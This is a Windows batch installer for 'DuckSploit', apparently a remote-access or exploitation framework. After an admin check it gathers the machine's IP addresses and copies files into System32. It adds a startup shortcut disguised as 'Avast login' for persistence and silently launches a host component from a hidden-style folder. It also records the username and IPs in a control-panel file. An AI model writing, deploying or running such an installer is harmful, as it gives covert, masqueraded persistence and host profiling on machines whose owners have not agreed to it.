@echo off

REM VERIFYING BAT WAS RUN AS ADMIN
net session > nul 2>&1
if /i not %errorlevel%==0 (
  echo You need to run this script as Admin.
  pause
  goto:eof
)

for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "ss IPv4"') do set ip=%%b
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "sse IPv4"') do set ip=%%b
set ip=%ip:~1%

for /f "delims=[] tokens=2" %%a in ('ping %computername% -6 -n 1 ^| findstr "["') do (set ipv6=%%a)


cls


color 0e

set current_dir=%~dp0
set server_dir=%current_dir:\scripts=%
set root_dir=%server_dir:\client=%

echo %server_dir%
cd %server_dir%




mkdir C:\DuckSploit
Xcopy %root_dir%\client C:\DuckSploit /E /H /C /I /q /Y
for /f %%i in (C:\DuckSploit\version.txt) do SET version=%%i

Xcopy "%root_dir%\client\scripts\startup\Avast login.Lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  /E /H /C /I /q /Y




echo.
echo [+] Installing Ducksploit v.%version% ...

@echo on
copy "%server_dir%\ds.bat" "C:\Windows\System32"
copy "%server_dir%\scripts\root\silentinstall.bat" "C:\Windows\System32"
copy "%server_dir%\nircmd.exe" "C:\Windows\System32"
echo [o] Ducksploit command version '%version%' configured!
@echo off



echo.
echo [o] Installation Finished!
echo [~] Loading hosting component...
mkdir C:\$DuckSploitw
Xcopy %root_dir%\host C:\$DuckSploitw /E /H /C /I /q /Y

cd C:\$DuckSploitw\
call C:\DuckSploit\scripts\silentinstall.vbs C:\$DuckSploitw\host.bat

echo [o] finished!

color F

REM set infos

(
echo Username: %username%
echo IPV4: %ip%
echo IPV6: %ipv6%
echo NetworkIP: %NetworkIP%
)>"C:\$DuckSploitw\pannel\user_infos.txt"

